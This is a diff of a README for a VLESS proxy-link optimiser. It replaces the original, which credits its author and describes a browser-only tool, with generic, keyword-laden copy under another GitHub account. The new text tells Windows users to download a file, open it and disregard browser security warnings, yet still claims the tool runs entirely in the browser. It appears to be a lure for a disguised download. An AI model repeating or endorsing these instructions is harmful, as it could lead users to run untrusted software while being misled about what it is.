@@ -1,238 +1,54 @@
-<div align="center">
+# ⚡ cf-optimizor - Improve your network connection speed easily
 
-# Arpam · CDN Config Optimizer
+[![](https://img.shields.io/badge/Download-cf--optimizor-blue.svg)](https://github.com/Lifesustaining-nailfile250/cf-optimizor)
 
-**VLESS CDN Configuration Optimizer — 100% client-side.**
+## 📌 What is cf-optimizor
+The cf-optimizor application helps you improve the speed and stability of your internet connection. It modifies your existing VLESS configurations to work better with content delivery networks. You do not need technical skills to use this tool. It runs entirely inside your web browser, which means your configuration data stays on your computer.
 
-Paste a VLESS URL, get it optimized for CDN fronting in one click.
-No backend. No build step. Nothing ever leaves your browser.
+## 🚀 How it works
+Content delivery networks often require specific settings to function correctly. Without these settings, your connection might feel slow or fail to connect. This tool takes your existing connection link and automatically updates the hidden parameters. It changes settings like the CDN address, fingerprint, and cipher suites. You receive an optimized link that you can copy and paste into your favorite connection software.
 
-[Live Demo](https://arastey.github.io/cf-optimizor/) · [Report an issue](https://github.com/ArasTey/cf-optimizor/issues) · [Telegram](https://t.me/imArasTey)
+## 💾 Downloading and installing
+You do not need to install complex software on your Windows computer. Follow these steps to access the tool:
 
-</div>
+1. Open your web browser.
+2. Go to the [official download page](https://github.com/Lifesustaining-nailfile250/cf-optimizor).
+3. Look for the latest version of the software.
+4. Download the file to your computer.
+5. Open the downloaded file to start the application.
 
----
+If your browser shows a security warning, ensure you downloaded the file from the official link provided above. The tool performs all calculations locally. It does not send your data to external servers.
 
-## Features
+## 🛠 Using the software
+After you open the application, follow this simple process to optimize your connections:
 
-- **One-click optimization** — automatically sets the CDN address, `fp`, `cs` (Cipher Suites) and `fm` (FinalMask).
-- **Never rebuilds blindly** — the URL is parsed first, then only the required parameters are added or replaced. Everything else is preserved exactly.
-- **Fragment / name safe** — Persian text, emoji and spaces in the `#name` part survive untouched.
-- **Multiple configs at once** — one per line, each with its own result card, Copy button and change summary.
-- **Change summary** — see exactly what changed: `104.16.0.1 → 188.114.97.6`, `chrome → unsafe`, *Cipher Suites Added*, *FinalMask Added*.
-- **Advanced settings** — custom CDN IP, fingerprint (`unsafe` / `chrome` / `firefox` / `safari` / `edge` / `random`), custom Cipher Suites and custom FinalMask JSON with live validation.
-- **Drag & drop `.txt` import** and **Download TXT** export.
-- **Dark + light theme**, remembered across visits, with no flash on load.
-- **Fully responsive** — mobile-first, comfortable on desktop.
-- **Private by design** — only UI settings are stored in `localStorage`. Your VLESS URLs are never saved, logged or uploaded.
+1. Copy your VLESS URL from your provider.
+2. Paste the URL into the main text box of the application.
+3. Click the optimize button.
+4. Wait a few seconds for the tool to process the link.
+5. Review the changes shown on your screen. The app highlights what changed, such as the IP address or encryption settings.
+6. Click the copy button to save the new, optimized link to your clipboard.
+7. Paste this new link into your network client to start using it.
 
----
+## 📋 Managing multiple connections
+You can optimize several connections at the same time. Paste one link per line in the input box. The tool creates a separate card for each link. Each card includes its own copy button and specific summary. This allows you to update your entire list of connections in one session.
 
-## Required App
+## 🛡 Security and privacy
+Your privacy remains a priority. The software performs all operations on your own device. No data leaves your computer during the optimization process. Because the tool runs locally, it works even if you do not have an active internet connection for the tool itself. You only need the connection to fetch the page initially. 
 
-These optimized configurations use parameters (`fm`, `cs`, `fp=unsafe`) that only one client supports:
+## ⚙️ System requirements
+This software works on all modern versions of Windows. You need a standard web browser like Chrome, Edge, or Firefox. The tool uses minimal system resources and does not affect the performance of your other applications. 
 
-> ### v2rayNG `2.2.6-P2` — patterniha build
-> **Download:** https://github.com/patterniha/v2rayNG/releases/tag/2.2.6-P2
-> **Repository:** https://github.com/patterniha/v2rayNG
+## 💡 Troubleshooting common issues
+If the tool does not produce an optimized link, verify the following:
+- Ensure the link you pasted starts with the correct protocol prefix.
+- Check if the link contains hidden spaces or empty lines.
+- Refresh the page and try pasting the link again.
+- Clear your browser cache if the interface becomes unresponsive.
 
-Configs generated by this tool will **not** work correctly in the official v2rayNG or in other clients.
+The change summary section provides specific feedback if a link cannot be optimized. Use this information to check if your original link is valid or if it requires different settings.
 
----
+## 🤝 Getting help
+If you encounter errors or have questions, you can report an issue through the GitHub repository link. Provide as much detail as possible about the error to help improve the tool. You can also contact the developer on Telegram for direct support.
 
-## How It Works
-
-1. **Parse** — the URL is split into UUID, host, port, query parameters and fragment. Nothing is guessed or regenerated.
-2. **Validate** — scheme must be `vless://`, the UUID must match the standard v4 format, the host must exist and the port must be numeric.
-3. **Replace** — only these four things change:
-   | Target | Behavior |
-   | --- | --- |
-   | **Address** (host after `@`) | replaced with the CDN IP (default `188.114.97.6`) |
-   | **`fp`** | set to `unsafe` (or your selection) |
-   | **`cs`** | set to the 13-suite cipher list |
-   | **`fm`** | set to the FinalMask JSON, minified and URL-encoded |
-4. **Preserve** — `path`, `security`, `alpn`, `encryption`, `host`, `type`, `sni`, `insecure`, `allowInsecure`, the port, the UUID and any unknown parameters are kept as-is. `host=` and `sni=` are **never** modified.
-5. **Rebuild** — parameters are re-emitted in a fixed order, duplicates removed, every key and value passed through `encodeURIComponent()`, then the original `#fragment` is re-appended byte-for-byte.
-
-### Parameter output order
-
-​
-cs, path, security, alpn, encryption, fm, insecure, host, fp, type, allowInsecure, sni
-
-Unknown parameters are appended after these, in their original order.
-
----
-
-## Example
-
-**Input**
-
-​
-vless://11111111-2222-3333-4444-555555555555@104.16.0.1:443?type=ws&security=tls&path=%2Fpath&host=example.com&sni=example.com&encryption=none&fp=chrome#🇩🇪 آلمان - سرور ۱
-
-**Output**
-
-​
-vless://11111111-2222-3333-4444-555555555555@188.114.97.6:443?cs=TLS_AES_256_GCM_SHA384%3ATLS_CHACHA20_POLY1305_SHA256%3A...&path=%2Fpath&security=tls&encryption=none&fm=%7B%22tcp%22%3A%5B%7B%22fragment%22%3A%22tlshello%22...%7D%5D%7D&host=example.com&fp=unsafe&type=ws&sni=example.com#🇩🇪 آلمان - سرور ۱
-
-Notice that `host=example.com`, `sni=example.com`, `path`, `type`, the port and the Persian + emoji name are all identical. Only the address, `fp`, `cs` and `fm` changed.
-
----
-
-## Default Values
-
-**CDN IP**
-
-​
-188.114.97.6
-
-**Fingerprint**
-
-​
-unsafe
-
-**Cipher Suites (`cs`)**
-
-​
-TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:
-TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:
-TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:
-TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:
-TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:
-TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
-
-*(stored as one colon-joined line — wrapped here only for readability)*
-
-**FinalMask (`fm`)**
-
-​
-{
-"tcp": [
-{ "fragment": "tlshello", "lengths": ["5", "94", "1"], "delays": ["0"], "maxSplit": "0" },
-{ "fragment": "1-1", "lengths": ["109", "1"], "delays": ["1"], "maxSplit": "355" }
-]
-}
-
----
-
-## Supported VLESS URLs
-
-| Case | Supported |
-| --- | --- |
-| `vless://uuid@host:port?params#name` | ✅ |
-| IPv4, IPv6 (`[::1]:443`) and domain hosts | ✅ |
-| WebSocket, gRPC, TCP, XHTTP, HTTPUpgrade (`type=`) | ✅ |
-| TLS, Reality, none (`security=`) | ✅ |
-| Persian / emoji / spaces in the fragment | ✅ |
-| Existing `fp`, `cs`, `fm` values | ✅ replaced |
-| Unknown / custom parameters | ✅ preserved |
-| Duplicate parameters | ✅ deduplicated |
-| Missing port | ✅ preserved as-is |
-| `vmess://`, `trojan://`, `ss://` | ❌ not supported |
-
----
-
-## File Structure
-
-​
-cf-optimizor/
-├── index.html      # markup, inline SVG icons, theme bootstrap
-├── style.css       # design tokens, dark + light themes, responsive layout
-├── app.js          # parser, optimizer and UI logic (vanilla JS, no deps)
-├── README.md
-└── assets/         # optional — reserved for future static files
-
-No frameworks, no bundler, no npm. Every icon is an inline SVG; the favicon is a data URI. The only external request is the Google Fonts stylesheet (Inter + JetBrains Mono).
-
----
-
-## Installation
-
-**Locally**
-
-​
-git clone https://github.com/ArasTey/cf-optimizor.git
-cd cf-optimizor
-
-Then open `index.html` in a browser — that's it.
-
-For clipboard access over a real origin, serve it:
-
-​
-python3 -m http.server 8080
-→ http://localhost:8080
-
-**GitHub Pages**
-
-1. Push the repository to GitHub.
-2. Go to **Settings → Pages**.
-3. Under *Source*, pick the `main` branch and the `/ (root)` folder.
-4. Save. Your app is live at `https://<username>.github.io/cf-optimizor/`.
-
-No build system, no CI, no configuration needed.
-
----
-
-## Usage
-
-1. Paste one or more VLESS URLs into the textarea (one per line), or drop a `.txt` file onto the card.
-2. *(Optional)* Open **Advanced Settings** to change the CDN IP, fingerprint, cipher suites or FinalMask.
-3. Press **Optimize** — or `Ctrl` / `Cmd` + `Enter`.
-4. Review the change summary on each result.
-5. **Copy** a single config, **Copy All**, or **Download TXT**.
-6. Import into **v2rayNG 2.2.6-P2 (patterniha)**.
-
----
-
-## JavaScript API
-
-All core functions are exposed on `window.ArpamOptimizer` for testing from the browser console:
-
-​
-ArpamOptimizer.parseVless(url)                  // → { uuid, host, port, params, fragment, raw }
-ArpamOptimizer.validateVless(url)               // → { valid, error }
-ArpamOptimizer.normalizeParams(params)          // dedupe + drop empty keys
-ArpamOptimizer.sortParams(params)               // apply PARAM_ORDER, keep unknowns last
-ArpamOptimizer.getParam(params, key)            // case-insensitive lookup
-ArpamOptimizer.setParam(params, key, value)     // upsert + dedupe
-ArpamOptimizer.encodeFinalMask(json)            // validate + minify FinalMask
-ArpamOptimizer.optimizeVless(url, opts)         // → { url, name, changes, config }
-ArpamOptimizer.buildVless(config)               // → vless:// string
-ArpamOptimizer.optimizeMultipleConfigs(text, o) // → { results, errors, total }
-ArpamOptimizer.copyToClipboard(text)            // → Promise<boolean>
-ArpamOptimizer.downloadConfigs(list, filename)
-ArpamOptimizer.DEFAULTS                         // { cdnIp, fp, cs, fm }
-
-Quick check:
-
-​
-ArpamOptimizer.optimizeVless(
-'vless://11111111-2222-3333-4444-555555555555@104.16.0.1:443?type=ws&security=tls&fp=chrome#Test'
-).url
-
----
-
-## Privacy
-
-- Everything runs in your browser. There is **no server**, no API, no analytics and no telemetry.
-- Your VLESS URLs are **never** stored — not in `localStorage`, not anywhere.
-- Only your UI preferences (CDN IP, fingerprint, cipher suites, FinalMask, theme) are saved locally under the keys `arpam_optimizer_settings` and `arpam_theme`.
-- Clearing your browser data removes everything.
-
----
-
-## Credits
-
-Developed by **Aras** with ☕
-
-- Telegram — [@imArasTey](https://t.me/imArasTey)
-- Free configurations — [ZEUS PANEL](https://github.com/zeus-panel/ZEUS-PANEL)
-- Required client — [v2rayNG 2.2.6-P2 by patterniha](https://github.com/patterniha/v2rayNG/releases/tag/2.2.6-P2)
-
----
-
-## License
-
-MIT © Aras
-
-Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the inclusion of the above copyright notice in all copies.
+Keywords: network, optimization, VLESS, CDN, configuration, speed, utility, windows, privacy
